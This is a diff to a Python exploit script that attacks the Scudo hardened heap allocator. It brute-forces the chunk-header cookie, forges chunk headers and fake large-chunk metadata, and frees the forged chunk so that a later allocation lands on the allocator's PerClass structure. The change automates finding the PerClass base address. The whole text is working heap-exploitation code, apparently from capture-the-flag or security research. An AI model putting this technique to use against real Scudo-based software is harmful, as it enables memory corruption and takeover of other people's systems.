@@ -56,6 +56,7 @@ info(f"bruteforced cookie: {hex(cookie)}")
 # mess with the chunk header at add2
 
 new_header = 0x8100
+new_header = create_header(0, 8, 1)
 forged_header = forge_header(add2, cookie, new_header)
 
 info("writing!!!!")
@@ -65,11 +66,13 @@ info("writing!!!!")
 
 largechunk_start = add2-0x40
 
-write(io, largechunk_start, forge_header(largechunk_start+0x10, cookie, 0x18102))
+exploit_perclass_header = create_header(20, 18, 1)
+
+write(io, largechunk_start, forge_header(largechunk_start+0x10, cookie, exploit_perclass_header))
 
 free(io, largechunk_start+0x10)
 
-write(io, largechunk_start, forge_header(largechunk_start+0x10, cookie, 0x18102))
+write(io, largechunk_start, forge_header(largechunk_start+0x10, cookie, exploit_perclass_header))
 
 free(io, largechunk_start+0x10)
 
@@ -77,12 +80,15 @@ write(io, add1, p64(largechunk_start))
 write(io, add1+0x8, p64(largechunk_start))
 
 
-perclass_add = int(input("give me the perclass address: "), 16)
+perclass_add = get_perclass_base(io, SCUDO_LIB, 20)
+#perclass_add = int(input("give me the perclass address: "), 16)
 
-print(f'perclass_addr')
+print(f'perclass base: 0x{perclass_add:x}')
 
-write(io, largechunk_start, p64(perclass_add+0x70)) #prev 
-write(io, largechunk_start+0x8, p64(perclass_add+0x70)) #next
+#write(io, largechunk_start, p64(perclass_add+0x70)) #prev 
+#write(io, largechunk_start+0x8, p64(perclass_add+0x70)) #next
+write(io, largechunk_start, p64(perclass_add+0x10)) #prev 
+write(io, largechunk_start+0x8, p64(perclass_add+0x10)) #next
 write(io, largechunk_start+0x10, p64(add1)) # CommitBase
 write(io, largechunk_start+0x18, p64(0x30000)) # CommitSize
 write(io, largechunk_start+0x20, p64(add1)) # MapBase
@@ -90,10 +96,11 @@ write(io, largechunk_start+0x28, p64(0x30000)) #MapSize
 write(io, largechunk_start+0x30, forged_header) # Forge Header
 
 
-#free(io, add1)
-#free(io, add2)
 free(io, add2)
-#populate_quarantine()
+
+perclass_chunk = malloc(io, 2000)[1]
+
+print(f'perclass chunk: 0x{perclass_chunk:x}')
 
 # =============================================================================
 
